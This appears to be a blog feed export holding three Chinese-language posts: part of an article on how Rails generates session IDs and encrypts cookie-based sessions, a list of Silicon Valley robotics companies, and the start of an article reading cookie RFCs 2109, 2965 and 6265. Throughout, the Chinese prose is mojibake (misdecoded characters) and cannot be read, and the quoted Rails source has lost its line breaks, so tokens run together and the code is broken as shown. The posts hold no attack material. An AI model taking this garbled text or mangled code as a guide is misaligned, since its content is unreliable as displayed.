åœ¨é€™ä»½æª”æ¡ˆä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°æœ‰ä¸€å€‹ function å«åšgenerate_sidï¼Œæ˜¯æ‹¿ä¾†ç”¢ç”Ÿ sessionID çš„ã€‚é€™å€‹ function å­˜åœ¨æ–¼ rails&#x2F;actionpack&#x2F;lib&#x2F;action_dispatch&#x2F;middleware&#x2F;session&#x2F;abstract_store.rbï¼š
def generate_sid    sid = SecureRandom.hex(16)    sid.encode!(Encoding::UTF_8)    sidend

ç›´æ¥å‘¼å«äº† Ruby çš„å‡½å¼åº« SecureRandom ä¾†ç”¢ç”Ÿäº‚æ•¸ä¸¦ç•¶ä½œ sessionIDã€‚
è‡³æ–¼åœ¨ Cookie è£¡é¢çš„ key æ˜¯ä»€éº¼ï¼Œå¯ä»¥ç¶“ç”±è¨­å®š app.config.session_store ä¾†èª¿æ•´ã€‚æ ¹æ“šé€™é‚Šçš„ç¨‹å¼ç¢¼ï¼š
# Setup default session store if not already set in config/application.rbinitializer :setup_default_session_store, before: :build_middleware_stack do |app|    unless app.config.session_store?        app_name = app.class.name ? app.railtie_name.chomp(&quot;_application&quot;) : &quot;&quot;        app.config.session_store :cookie_store, key: &quot;_#&#123;app_name&#125;_session&quot;    endend

é è¨­å€¼æœƒæ˜¯ _#&#123;app_name&#125;_sessionï¼Œä¾‹å¦‚èªªæˆ‘çš„ app_name å«åš huliï¼ŒCookie åç¨±å°±æœƒæ˜¯ _huli_sessionã€‚
ç„¶å¾ŒæŠŠ session information å¯¦éš›å¯«é€²å» cookie çš„åœ°æ–¹åœ¨ rails&#x2F;actionpack&#x2F;lib&#x2F;action_dispatch&#x2F;middleware&#x2F;session&#x2F;cookie_store.rbï¼š
def set_cookie(request, session_id, cookie)  cookie_jar(request)[@key] = cookieenddef get_cookie(req)  cookie_jar(req)[@key]enddef cookie_jar(request)  request.cookie_jar.signed_or_encryptedend

æœƒå‘¼å«èˆ‡ cookie ç›¸é—œçš„ signed_or_encrypted ä¾†åšè™•ç†ã€‚
æ¥è‘—æˆ‘å»æœäº†ä¸€ä¸‹æ–‡ä»¶ï¼Œç™¼ç¾å…¶å¯¦å®˜æ–¹æ–‡ä»¶éƒ½å¯«å¾—ååˆ†æ¸…æ¥šäº†ï¼š

The session ID is generated using SecureRandom.hex which generates a random hex string using platform specific methods (such as OpenSSL, &#x2F;dev&#x2F;urandom or Win32 CryptoAPI) for generating cryptographically secure random numbers. Currently it is not feasible to brute-force Railsâ€™ session IDs.

ä¸Šé¢é€™æ®µå¯«äº† sessionID çš„ç”¢ç”Ÿæ–¹å¼ã€‚

The CookieStore uses the encrypted cookie jar to provide a secure, encrypted location to store session data. Cookie-based sessions thus provide both integrity as well as confidentiality to their contents. The encryption key, as well as the verification key used for signed cookies, is derived from the secret_key_base configuration value.
As of Rails 5.2 encrypted cookies and sessions are protected using AES GCM encryption. This form of encryption is a type of Authenticated Encryption and couples authentication and encryption in single step while also producing shorter ciphertexts as compared to other algorithms previously used. The key for cookies encrypted with AES GCM are derived using a salt value defined by the config.action_dispatch.authenticated_encrypted_cookie_salt configuration value.

é€™æ®µå‰‡æ˜¯å¯«èªªå¾ Rails 5.2 é–‹å§‹æ¡ç”¨ AES GCM ä¾†åŠ å¯†ï¼Œåº•ä¸‹é‚„æœ‰ä¸€å€‹æ®µè½æˆ‘æ²’è¤‡è£½ï¼Œä¸»è¦æ˜¯æåˆ°ä¹‹å‰ç¨‹å¼ç¢¼è¨»è§£è£¡é¢å¯«çš„ï¼ŒRails 4 å‰åªç”¨ HMAC ä¾†åšé©—è­‰ï¼Œè€Œä¸æ˜¯åŠ å¯†ã€‚
è€Œä¸”æˆ‘çœ‹ä¸€çœ‹ä¹‹å¾Œç™¼ç¾é€™æ–‡ä»¶å¯«çš„å¥½æ£’å–”ï¼Œé™¤äº†æŠŠé€™äº›æ©Ÿåˆ¶èªªæ˜æ¸…æ¥šä»¥å¤–ï¼Œåº•ä¸‹é‚„ä»‹ç´¹äº†æˆ‘å€‘ä¸Šä¸€ç¯‡æåˆ°çš„ Session Fixation Attack ä»¥åŠ CSRFã€‚
è‹¥æ˜¯é‚„æƒ³æ·±å…¥ç ”ç©¶ï¼Œå¯ä»¥åƒè€ƒ Rails è£¡é¢ Cookie ç›¸é—œçš„å¯¦ä½œï¼šrails&#x2F;actionpack&#x2F;lib&#x2F;action_dispatch&#x2F;middleware&#x2F;cookies.rbï¼Œè¨»è§£è£¡é¢æœ‰è©³ç´°çš„èªªæ˜ï¼Œä¾‹å¦‚èªªåŠ å¯†çš„éƒ¨åˆ†ï¼š
# Returns a jar that&#x27;ll automatically encrypt cookie values before sending them to the client and will decrypt them for read.# If the cookie was tampered with by the user (or a 3rd party), +nil+ will be returned.#  # If +secret_key_base+ and +secrets.secret_token+ (deprecated) are both set,# legacy cookies signed with the old key generator will be transparently upgraded.#  # If +config.action_dispatch.encrypted_cookie_salt+ and +config.action_dispatch.encrypted_signed_cookie_salt+# are both set, legacy cookies encrypted with HMAC AES-256-CBC will be transparently upgraded.#  # This jar requires that you set a suitable secret for the verification on your app&#x27;s +secret_key_base+.#  # Example:#  #   cookies.encrypted[:discount] = 45#   # =&gt; Set-Cookie: discount=DIQ7fw==--K3n//8vvnSbGq9dA--7Xh91HfLpwzbj1czhBiwOg==; path=/#  #   cookies.encrypted[:discount] # =&gt; 45def encrypted  @encrypted ||= EncryptedKeyRotatingCookieJar.new(self)end

å¾€åº•ä¸‹è¿½çš„è©±å°±å¯ä»¥çœ‹åˆ° EncryptedKeyRotatingCookieJar çš„å®Œæ•´ç¨‹å¼ç¢¼ï¼Œæˆ–ä½ ä¹Ÿå¯ä»¥å†å¾€ä¸‹ï¼Œçœ‹çœ‹ rails&#x2F;activesupport&#x2F;lib&#x2F;active_support&#x2F;message_encryptor.rbï¼Œè² è²¬åŠ å¯†çš„ç¨‹å¼ç¢¼é•·é€™æ¨£ï¼š
def _encrypt(value, **metadata_options)    cipher = new_cipher    cipher.encrypt    cipher.key = @secret      # Rely on OpenSSL for the initialization vector    iv = cipher.random_iv    cipher.auth_data = &quot;&quot; if aead_mode?      encrypted_data = cipher.update(Messages::Metadata.wrap(@serializer.dump(value), metadata_options))    encrypted_data &lt;&lt; cipher.final      blob = &quot;#&#123;::Base64.strict_encode64 encrypted_data&#125;--#&#123;::Base64.strict_encode64 iv&#125;&quot;    blob = &quot;#&#123;blob&#125;--#&#123;::Base64.strict_encode64 cipher.auth_tag&#125;&quot; if aead_mode?    blobend

é€™è£¡çš„ cipher æ˜¯å¾ openssl ä¾†çš„ï¼Œæ‰€ä»¥æœ€åº•å±¤æ˜¯ä½¿ç”¨äº† opensslã€‚
æ•´ç†åˆ°é€™é‚Šæ‡‰è©²å°±å·®ä¸å¤šäº†ï¼Œå°±ä¸å†ç¹¼çºŒæ·±å…¥äº†ã€‚
ç¸½çµåœ¨é€™ç¯‡è£¡é¢æˆ‘å€‘çœ‹äº†ä¸‰å€‹ä¸åŒçš„ Session å„²å­˜æ–¹å¼ã€‚ç¬¬ä¸€ç¨®æ˜¯ express-sessionï¼ŒæŠŠ session information å­˜åœ¨è¨˜æ†¶é«”è£¡é¢ï¼›ç¬¬äºŒç¨®æ˜¯ PHPï¼Œå­˜åœ¨æª”æ¡ˆè£¡é¢ï¼›æœ€å¾Œä¸€ç¨®å‰‡æ˜¯ Railsï¼Œæ¡ç”¨äº†ä¹‹å‰æéçš„ cookie-based sessionï¼Œå°‡è³‡è¨Šç›´æ¥åŠ å¯†ä¸¦ä¸”å­˜åœ¨ cookie è£¡ã€‚
åœ¨é€™ç³»åˆ—ç•¶ä¸­ï¼Œç¬¬ä¸€ç¯‡æ–‡ç« æˆ‘å€‘ç†è§£äº†æ¦‚å¿µï¼Œç¬¬äºŒç¯‡åˆ©ç”¨è®€ RFC åŠ æ·±å°è±¡ä¸¦é‡æ–°ç†è§£äº†ä¸€æ¬¡ Sessionï¼Œæœ€å¾Œä¸€ç¯‡å‰‡æ˜¯ç›´æ¥åƒè€ƒä¸€äº›ä¸»æµæ¡†æ¶çš„å¯¦ä½œï¼Œçœ‹çœ‹æˆ‘å€‘ä¹‹å‰æ‰€æåˆ°çš„ sessionID æ‡‰è©²å¦‚ä½•ç”¢ç”Ÿï¼Œsession information æ‡‰è©²å­˜åœ¨å“ªè£¡ï¼Œcookie-bases session åˆæ‡‰è©²å¦‚ä½•å¯¦ä½œã€‚
å¯«é€™ç³»åˆ—çš„åˆè¡·å°±æ˜¯æƒ³è®“å¤§å®¶æŠŠé€™äº›æ¦‚å¿µä¸€æ¬¡ç†è§£æ¸…æ¥šï¼Œå°±ä¸ç”¨ä»¥å¾Œæ¯æ¬¡ç¢°åˆ°éƒ½é‡æ–°æŸ¥ä¸€éã€‚
æœ€å¾Œï¼Œå¸Œæœ›é€™ç³»åˆ—å°å¤§å®¶æœ‰å¹«åŠ©ï¼Œæœ‰ä»»ä½•éŒ¯èª¤éƒ½å¯ä»¥åœ¨åº•ä¸‹ç•™è¨€åæ˜ ã€‚
åº•ä¸‹æ˜¯ç³»åˆ—æ–‡çš„å®Œæ•´æ¸…å–®ï¼š

ç™½è©± Session èˆ‡ Cookieï¼šå¾ç¶“ç‡Ÿé›œè²¨åº—é–‹å§‹
æ·ºè«‡ Session èˆ‡ Cookieï¼šä¸€èµ·ä¾†è®€ RFC
æ·±å…¥ Session èˆ‡ Cookieï¼šExpressã€PHP èˆ‡ Rails çš„å¯¦ä½œ

é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>web</tag>
        <tag>cookie</tag>
        <tag>session</tag>
      </tags>
  </entry>
  <entry>
    <title>çŸ½è°·æ©Ÿå™¨äººå…¬å¸ä¸€è¦½ &amp; ç›¸é—œè³‡æº</title>
    <url>/2019/06/08/silicon-valley-robotics-company/</url>
    <content><![CDATA[å‰è¨€ä»Šå¤©æƒ³è¦æ•´ç†ä¸€äº›ç£å€æ©Ÿå™¨äººå…¬å¸çš„ç›¸é—œè³‡è¨Šï¼Œå¸Œæœ›å°ä¹‹å¾Œæœ‰èˆˆè¶£åˆ°çŸ½è°·åšæ©Ÿå™¨äººçš„æœ‹å‹æœ‰å¹«åŠ©ã€‚å¦å¤–é™¤äº†å…¬å¸åˆ—è¡¨ä¹‹å¤–ï¼Œä¹Ÿæœƒé †ä¾¿æä¾›ä¸€äº›å…¶ä»–çš„è³‡æº(æ¯”å¦‚ç›¸é—œçµ„ç¹”ï¼Œæˆ–æ˜¯å¯ä»¥æœå°‹è·ä½çš„ç¶²ç«™)ã€‚
å…¬å¸åˆ—è¡¨èˆ‡ä»‹ç´¹è‡ªå‹•é§•é§›
Zoox @ Foster City

Cruise Automation @ San Francisco

Embark @ San Francisco
 Embark æ˜¯åš Self-driving truck çš„å…¬å¸ï¼Œé€™ä¸€å¡Šçš„å¸‚å ´å¾ˆå¤§ï¼Œè€Œä¸”å¤§éƒ¨åˆ†çš„è·¯é€”éƒ½æ˜¯åœ¨è»Šæµè¼ƒå–®ç´”çš„å…¬è·¯ä¸Šï¼Œå€‹äººè¦ºå¾—æ»¿æœ‰æ½›åŠ›çš„ã€‚

pony.ai @ Fremont

lvl5 @ San Francisco
 é€™é–“å…¬å¸ä¸»è¦æ˜¯æä¾›å¾ˆå¥½çš„ Mapï¼Œè®“æƒ³è¦åšè‡ªå‹•é§•é§›çš„å…¬å¸æœ‰å¾ˆå¥½çš„åœ°åœ–å¯ä»¥ç”¨ï¼Œä¹Ÿå¾ˆæœ‰è¶£ã€‚

Starsky Robotics @ San Francisco
 é€™é–“å…¬å¸ä¹Ÿæ˜¯åš Self-driving truckã€‚

DeepMap @ Palo Alto

Drive.ai @ San Carlos


ç¾åœ¨è‡ªå‹•é§•é§›å¾ˆç†±é–€ï¼Œé‚„æœ‰å¾ˆå¤šå…¬å¸å°±ä¸åˆ—é€²ä¾†äº†ï¼Œå¦‚æœå¤§å®¶æœ‰èˆˆè¶£ï¼Œå¯ä»¥å¾ä¸‹é¢çš„ä¸€äº›æœå°‹è·ç¼ºè³‡æºå»æ‰¾ã€‚
æœå‹™å‹æ©Ÿå™¨äºº
savioke @ San Jose
 ä»–å€‘çš„æ©Ÿå™¨äººä¸»è¦æ‡‰ç”¨åœ¨é†«é™¢ï¼Œæ—…é¤¨ç­‰ç­‰åœ°æ–¹ï¼Œç”¨ä¾†éé€æ±è¥¿ã€‚

Chowbotics @ Hayward
 é€™é–“å…¬å¸æ˜¯åšå¯ä»¥è‡ªå·±åšé£Ÿç‰©çš„æ©Ÿå™¨äººã€‚


å·¥æ¥­&#x2F;è¾²æ¥­è‡ªå‹•åŒ–
Fetch Robotics @ San Jose
 ç”± Willow Garage çš„åœ˜éšŠ spin off å‡ºä¾†çš„ Fetch Robotics æ˜¯ä¸»åŠ›æ”¾åœ¨ç‰©æµè‡ªå‹•åŒ–çš„ä¸€é–“å…¬å¸ï¼Œä»–å€‘çš„æ©Ÿå™¨äººä¹Ÿæ˜¯ç›®å‰è¨±å¤šå¤§å­¸æœƒç”¨ä¾†åšç ”ç©¶çš„å¹³å°ï¼Œæ†‘è—‰è‘—å¼·å¤§çš„æŠ€è¡“å¯¦åŠ›ï¼Œæ˜¯ä¸€é–“å¾ˆä¸éŒ¯çš„å…¬å¸ã€‚

Blue River Technology @ Sunnyvale
 é€™é–“å…¬å¸æ˜¯è¾²æ¥­è‡ªå‹•åŒ–æ¥­ç•Œæ»¿æœ‰åçš„å…¬å¸ï¼Œç¸½éƒ¨åœ¨ Sunnyvaleã€‚


å…¶ä»–ç›¸é—œè³‡æºçµ„ç¹”
Silicon Valley Robotics
  é€™å€‹çµ„ç¹”æä¾›äº†ä¸éŒ¯çš„æ•´åˆè³‡æºï¼Œä»–å€‘æœƒå®šæœŸèˆ‰è¾¦ä¸€äº›æ´»å‹•ï¼Œæœ‰æä¾›éƒ¨è½æ ¼ï¼Œä¹Ÿæœ‰å®šæœŸçš„ Newsletter å¯ä»¥é—œæ³¨ã€‚


æ–‡ç« æˆ–è¨è«–ä¸²
What are all the robotics companies in Silicon Valley?
The Top 14 Successful Robotics Startups Last Year

è·ç¼º
Robots.Jobs
Robotics Startups on AngelList
Robotics Jobs in San Francisco Bay Area

Tour
Visit Innovative Robotics Companies in Silicon Valley

ç¸½çµä»Šå¤©è·Ÿå¤§å®¶ä»‹ç´¹äº†ä¸€äº›çŸ½è°·çš„æ©Ÿå™¨äººå…¬å¸ï¼Œä¹Ÿæ•´ç†äº†ä¸€äº›å°‹æ‰¾è·ç¼ºæˆ–æ›´æ·±å…¥è·Ÿç£å€æ©Ÿå™¨äººç¤¾ç¾¤é€£çµçš„è³‡æºï¼Œå¸Œæœ›æœªä¾†å°å¤§å®¶æœƒæœ‰å¹«åŠ©ï¼
å»¶ä¼¸é–±è®€
Self Driving Car Startups to Watch
Looking towards service robotics in 2017

é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººã€é›»è…¦è¦–è¦ºå’Œäººå·¥æ™ºæ…§æœ‰å°‘è¨±ç ”ç©¶ï¼Œæ­£åœ¨å­¸ç¿’ç”¨å¿ƒé«”æœƒäº‹ç‰©çš„æœ¬è³ªè·Ÿä¸æ–·é€²å…¥å­¸ç”Ÿå¿ƒæ…‹æ”¹é€²ã€‚
]]></content>
      <tags>
        <tag>Robotics company, Silicon Valley, Job</tag>
      </tags>
  </entry>
  <entry>
    <title>æ·ºè«‡ Session èˆ‡ Cookieï¼šä¸€èµ·ä¾†è®€ RFC</title>
    <url>/2019/08/10/session-and-cookie-rfc/</url>
    <content><![CDATA[å‰è¨€é€™æ˜¯ä¸€ç³»åˆ—å…±ä¸‰ç¯‡çš„æ–‡ç« ï¼Œæˆ‘ç¨±ä¹‹ç‚º Session èˆ‡ Cookie ä¸‰éƒ¨æ›²ã€‚ç³»åˆ—æ–‡çš„ç›®æ¨™æ˜¯æƒ³è¦ç”±æ·ºå…¥æ·±ä¾†è«‡è«‡é€™å€‹ç¶“å…¸è­°é¡Œï¼Œå¾ç†è§£æ¦‚å¿µä¸€ç›´åˆ°ç†è§£å¯¦ä½œæ–¹å¼ã€‚é€™æ˜¯ç³»åˆ—æ–‡çš„ç¬¬äºŒç¯‡ï¼Œä¸‰ç¯‡çš„å®Œæ•´é€£çµå¦‚ä¸‹ï¼š

ç™½è©± Session èˆ‡ Cookieï¼šå¾ç¶“ç‡Ÿé›œè²¨åº—é–‹å§‹
æ·ºè«‡ Session èˆ‡ Cookieï¼šä¸€èµ·ä¾†è®€ RFC
æ·±å…¥ Session èˆ‡ Cookieï¼šExpressã€PHP èˆ‡ Rails çš„å¯¦ä½œ

åœ¨ä¸Šä¸€ç¯‡è£¡é¢ï¼Œæˆ‘å€‘æåˆ°äº† Session çš„æ„æ€ï¼š

Session æ˜¯ä»€éº¼ï¼Ÿå°±æ˜¯ä¸€ç¨®è®“ Request è®Šæˆ stateful çš„æ©Ÿåˆ¶ã€‚ä»¥å°æ˜çš„ä¾‹å­ä¾†èªªï¼ŒSession å°±æ˜¯ä¸€ç¨®è®“å®¢äººä¹‹é–“èƒ½äº’ç›¸é—œè¯èµ·ä¾†çš„æ©Ÿåˆ¶ã€‚åœ¨æ•…äº‹è£¡é¢æˆ‘å€‘ç”¨äº†ç´™æ¢è·Ÿæ‰‹æ©Ÿè£¡çš„è³‡è¨Šä¾†æ¯”å–»ï¼Œæœ‰å¤šç¨®æ–¹å¼å¯ä»¥é”æˆ Sessionã€‚

å…¶å¯¦åœ¨å¯«é€™ç³»åˆ—çš„æ™‚å€™ï¼Œã€ŒSession æœ€æ˜ç¢ºçš„å®šç¾©æ˜¯ä»€éº¼ã€å›°æ“¾äº†æˆ‘ä¸€é™£å­ï¼Œè€Œä¸”æˆ‘åˆ°ç¾åœ¨é‚„ä¸èƒ½å®Œå…¨è‚¯å®šåˆ°åº•æ€æ¨£æ‰æ˜¯å°çš„ã€‚åœ¨æˆ‘å¿ƒä¸­æœ‰å…©å€‹è§£é‡‹éƒ½æ»¿åˆç†çš„ï¼Œç¬¬ä¸€å€‹è§£é‡‹å°±æ˜¯ä¸Šä¸€ç¯‡è·Ÿå¤§å®¶è¬›çš„ï¼ŒSession æ˜¯ä¸€ç¨®è®“ Request è®Šæˆ stateful çš„ã€Œæ©Ÿåˆ¶ã€ï¼Œè€Œ Session çš„ç¬¬äºŒç¨®è§£é‡‹ï¼ˆä¹Ÿæ˜¯æ¯”è¼ƒè²¼è¿‘è‹±æ–‡åŸæ–‡çš„è§£é‡‹ï¼‰ï¼Œå°±æ˜¯ã€Œå…·æœ‰ç‹€æ…‹çš„ä¸€æ®µæœŸé–“ã€ï¼Œæˆ–è€…æ˜¯ã€Œä¸Šä¸‹æ–‡ã€ï¼Œæ‰€ä»¥åœ¨ Session è£¡é¢çš„æ±è¥¿å¯ä»¥æ”¾åœ¨ä¸€èµ·çœ‹ã€‚
æœ‰ä¸€ç¨®èªªæ³•èªç‚º Session çš„åŸæ„çš„ç¢ºæ˜¯ç¬¬äºŒç¨®ï¼Œä½†æ˜¯åœ¨ Web é ˜åŸŸä¸­ Session è½‰è®Šæˆäº†ä¸€ç¨®ã€Œæ©Ÿåˆ¶ã€ï¼Œæ‰€ä»¥å…©å€‹æ„æ€éƒ½é€šã€‚ä½†æˆ‘è‡ªå·±å…¶å¯¦æ˜¯æ¯”è¼ƒå‚¾å‘ç¬¬äºŒç¨®æ‰æ˜¯å”¯ä¸€æ­£ç¢ºçš„è§£é‡‹æ–¹æ³•ï¼Œå¾é ­åˆ°å°¾ç¬¬äºŒç¨®éƒ½æ˜¯å°çš„ï¼Œç¬¬ä¸€ç¨®å‰‡æ˜¯èª¤è§£ã€‚
èˆ‰å€‹ä¾‹å­ä¾†èªªï¼Œå¦‚æœä½ æœ‰ç”¨é Google Analyticsï¼Œè£¡é¢æœ‰å€‹åè©å«åšã€Œå·¥ä½œéšæ®µã€ï¼Œè‹±æ–‡åŸåå°±å«åš Sessionï¼Œè€Œ Google å° Session çš„è§£é‡‹æ˜¯é€™æ¨£çš„ï¼š

ï¼ˆä¾†æºï¼šAnalytics (åˆ†æ) å®šç¾©ç¶²é å·¥ä½œéšæ®µçš„æ–¹å¼ï¼‰
å®ƒæŠŠ Session å®šç¾©ç‚ºã€ŒæŒ‡å®šæœŸé–“å…§åœ¨ç¶²ç«™ä¸Šç™¼ç”Ÿçš„å¤šé …ä½¿ç”¨è€…äº’å‹•ã€ï¼Œä¸¦ä¸”èªªå¯ä»¥æŠŠ Session ç•¶ä½œä¸€å€‹å®¹å™¨ï¼ˆContainerï¼‰ã€‚é›–ç„¶èªª Google Analytics çš„ Session è·Ÿ Web æŠ€è¡“ä¸Šæ‰€ä½¿ç”¨çš„ Session æœ¬ä¾†å°±ä¸åŒï¼Œä½†æˆ‘èªç‚ºå¤šå°‘å¯ä»¥äº’ç›¸åƒè€ƒã€‚è€Œé€™å€‹ Session çš„å®šç¾©èˆ‡æˆ‘å‰é¢æ‰€èªªçš„ã€Œå…·æœ‰ç‹€æ…‹çš„ä¸€æ®µæœŸé–“ã€æˆ–è€…æ˜¯ã€Œä¸Šä¸‹æ–‡ã€å…¶å¯¦æ˜¯é›·åŒçš„ã€‚
é‚£ç‚ºä»€éº¼å„˜ç®¡æˆ‘æ¯”è¼ƒåå‘é€™å€‹å®šç¾©ï¼Œå»åœ¨ä¸Šä¸€ç¯‡è£¡é¢éš»å­—ä¸æï¼Œé‚„æŠŠ Session å®šç¾©æˆæˆ‘çœ¼ä¸­çš„ã€Œèª¤è§£ã€ï¼Ÿ
ç¬¬ä¸€å€‹åŸå› æ˜¯æä¸å¥½å…©ç¨®è§£é‡‹éƒ½èªªå¾—é€šï¼Œæ‰€ä»¥æœ‰å¯èƒ½å…©å€‹éƒ½æ˜¯å°çš„ã€‚ç¬¬äºŒå€‹åŸå› æ˜¯æˆ‘æ‰€èªç‚ºçš„ Session ç²¾ç¢ºå®šç¾©éå¸¸ä¸å¥½è§£é‡‹ï¼Œå› ç‚ºæ¦‚å¿µå¤ªæŠ½è±¡äº†ã€‚æˆ‘èªç‚ºè‹¥æ˜¯æäº†é€™å€‹è§£é‡‹ï¼ŒåªæœƒæŠŠä½ å° Session çš„ç†è§£è¶Šæè¶Šäº‚ï¼Œå› æ­¤ä¸Šä¸€ç¯‡æ‰æ²’æœ‰æåˆ°é€™å€‹ã€‚ç¬¬ä¸‰å€‹åŸå› æ˜¯æˆ‘èªç‚ºè§£é‡‹æˆæ©Ÿåˆ¶ä¹Ÿå¯ä»¥ï¼Œè€Œä¸”æ¯”è¼ƒå¥½ç†è§£ï¼Œå°±ç®—å®ƒçœŸçš„æ˜¯éŒ¯èª¤çš„ï¼Œé€ æˆçš„å½±éŸ¿ä¹Ÿæ²’é‚£éº¼å¤§ã€‚
ç¸½ä¹‹å‘¢ï¼Œæˆ‘èªç‚ºå°å®Œå…¨æ²’æœ‰åŸºç¤çš„äººä¾†èªªï¼ŒæŠŠ Session ç†è§£æˆä¸€ç¨®æ©Ÿåˆ¶å°±å¯ä»¥äº†ã€‚ä½†æ˜¯å°æ–¼åƒæˆ‘é€™ç¨®æƒ³è¦è¿½æ ¹ç©¶åº•çš„äººä¾†èªªï¼Œæˆ‘æƒ³çŸ¥é“çš„æ˜¯æœ€æ­£ç¢ºçš„ç†è§£ï¼Œè€Œä¸”å¿…é ˆæ˜¯æœ‰æ†‘æœ‰æ“šçš„ã€‚
è¦æ€æ¨£æ‰å«åšæœ‰æ†‘æœ‰æ“šå‘¢ï¼Ÿå»çœ‹ç•¶å¹´è«‡è«– Cookie èˆ‡ Session çš„ RFC æ–‡ä»¶æ‡‰è©²å¤ æœ‰æ†‘æœ‰æ“šäº†å§ï¼ŸRFC æ–‡ä»¶å¯æ˜¯è¦ç¶“æ­·éä¸€ç³»åˆ—è¨è«–èˆ‡å¯©æ ¸ä¹‹å¾Œæ‰èƒ½èª•ç”Ÿï¼Œæˆ‘æƒ³ä¸åˆ°æœ‰å“ªé‚Šçš„è§£é‡‹èƒ½æ¯” RFC æ›´å…·æœ‰èªªæœåŠ›ã€‚
åœ¨é€™ç¯‡æ–‡ç« ä¸­æˆ‘å€‘æœƒä¾†ç¨å¾®è®€ä¸€ä¸‹ä¸‰ä»½ RFCï¼š

RFC 2109
RFC 2965
RFC 6265

ç‚ºä»€éº¼è¦è®€ä¸‰ä»½å‘¢ï¼Ÿå› ç‚ºé€™ä¸‰ä»½éƒ½æ˜¯è·Ÿ Cookie ç›¸é—œçš„æ–‡ä»¶ï¼Œ2109 æ˜¯æœ€æ—©çš„ä¸€ä»½ï¼Œå¾Œä¾†å‡ºç¾ä¸€äº›å•é¡Œæ‰€ä»¥è¢«æ–°çš„ 2965 å–ä»£ï¼Œéäº†åå¹´å¾Œæœ‰äº† 6265ï¼Œæ˜¯ç›®å‰æœ€æ–°çš„æ¨™æº–ã€‚
æˆ‘èªç‚ºè®€æ±è¥¿å¾æœ€æ—©æœŸçš„æ™‚å€™é–‹å§‹è®€èƒ½å¤ äº‹åŠåŠŸå€ï¼Œå› ç‚ºæ±è¥¿æ‡‰è©²æœƒæœ€å°‘ï¼Œç†è§£ä¸Šä¹Ÿæ¯”è¼ƒå®¹æ˜“ï¼Œæ‰¾è³‡æ–™ä¹Ÿå¥½æ‰¾ã€‚ä¾‹å¦‚èªªè¦è®€ React åŸå§‹ç¢¼æˆ‘æœƒæ¨è–¦å¾æœ€æ—©çš„ 0.xx ç‰ˆæœ¬é–‹å§‹è®€ï¼Œè®€ ECMAScript ä¹Ÿå¯ä»¥å¾ ES3 é–‹å§‹ï¼Œé‚„å¯ä»¥é †ä¾¿çŸ¥é“æ¼”é€²çš„éç¨‹ã€‚
å‰æƒ…æè¦å¤§æ¦‚å°±åˆ°é€™é‚Šäº†ï¼Œæœ¬æ–‡çš„ç›®æ¨™å°±æ˜¯ä¾†è®€ RFCï¼Œçœ‹çœ‹è£¡é¢æ˜¯æ€éº¼èªª Cookie èˆ‡ Session çš„ã€‚è£¡é¢æˆ‘æœƒå°åŸæ–‡åšä¸€äº›ç¿»è­¯ï¼Œä½†ç•¢ç«Ÿç¿»è­¯æ˜¯é …å°ˆæ¥­ï¼Œæˆ‘ç¿»çš„å¾ˆå·®è€Œä¸”ä¸€å®šæœ‰éŒ¯èª¤ï¼Œæ‹œè¨—å¤§å®¶é‚„æ˜¯è¦çœ‹åŸæ–‡ï¼Œç¿»è­¯åªèƒ½ç•¶ä½œè¼”åŠ©ã€‚å¦‚æœæœ‰å“ªé‚ŠéŒ¯çš„å¾ˆé›¢è­œæ­¡è¿æŒ‡å‡ºï¼Œæˆ‘æœƒååˆ†æ„Ÿè¬ã€‚
RFC 2109RFC 2109 ç™¼ä½ˆæ–¼ 1997 å¹´ 2 æœˆï¼Œé‚£æ˜¯å€‹é‚„æ²’æœ‰ Ajax çš„å¹´ä»£ï¼Œæ˜¯å€‹ Netscape é‚„ç¨±éœ¸ç€è¦½å™¨å¸‚å ´çš„å¹´ä»£ã€‚
é€™ä»½æ–‡ä»¶çš„æ¨™é¡Œå«åšï¼šã€ŒHTTP State Management Mechanismã€ï¼Œç›´ç¿»å°±æ˜¯ HTTP ç‹€æ…‹ç®¡ç†æ©Ÿåˆ¶ã€‚
å…ˆä¾†çœ‹æ‘˜è¦çš„éƒ¨åˆ†ï¼š

This document specifies a way to create a stateful session with HTTP requests and responses.  It describes two new headers, Cookie and Set-Cookie, which carry state information between participating origin servers and user agents.  The method described here differs from Netscapeâ€™s Cookie proposal, but it can interoperate with HTTP&#x2F;1.0 user agents that use Netscapeâ€™s method.  (See the HISTORICAL section.)
é€™ä»½æ–‡ä»¶è¦å®šäº†ä¸€ç¨®åˆ©ç”¨ HTTP request èˆ‡ response å»ºç«‹æœ‰ç‹€æ…‹çš„ session çš„æ–¹æ³•ï¼Œä¸¦ä»‹ç´¹äº†å…©å€‹æ–°çš„ headerï¼šCookie è·Ÿ Set-Cookieï¼Œè—‰ç”±é€™å…©å€‹ header åœ¨ server èˆ‡ user agentï¼ˆé€šå¸¸å°±æ˜¯æŒ‡ç€è¦½å™¨ï¼‰ä¹‹é–“å‚³éè³‡è¨Šã€‚é€™é‚Šæ‰€æåˆ°çš„æ–¹æ³•èˆ‡ Netscape çš„ Cookie ææ¡ˆä¸åŒï¼Œä½†å¯ä»¥äº’ç›¸å…¼å®¹ã€‚

ï¼ˆæ¯æ¬¡ç¿»è­¯ç¿»ä¸€ç¿»å°±æœƒä¸æƒ³ç¿»äº†â€¦å› ç‚ºç¸½è¦ºå¾—è‡ªå·±ç¿»è­¯å¾—ä¸å¤ ç²¾ç¢ºï¼Œç¿»è­¯çœŸæ»´é›£ï¼‰
æ‘˜è¦å¯«å¾—å¾ˆæ˜ç¢ºäº†ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯å¼•å…¥ Cookie èˆ‡ Set-Cookie å…©å€‹ Header ä¾†å»ºç«‹ Sessionã€‚æœƒç‰¹åˆ¥æåˆ° Netscape æ˜¯å› ç‚º Cookie é€™æ±è¥¿æœ€æ—©æ˜¯ Netscape è‡ªå·±å¯¦ä½œçš„ï¼Œåªå¯æƒœæˆ‘èƒ½æ‰¾åˆ°çš„é€£çµéƒ½æ­»æ‰äº†ï¼Œç„¡ç·£çœ‹åˆ° Netscape çš„ Cookie è¦ç¯„é•·ä»€éº¼æ¨£å­ã€‚
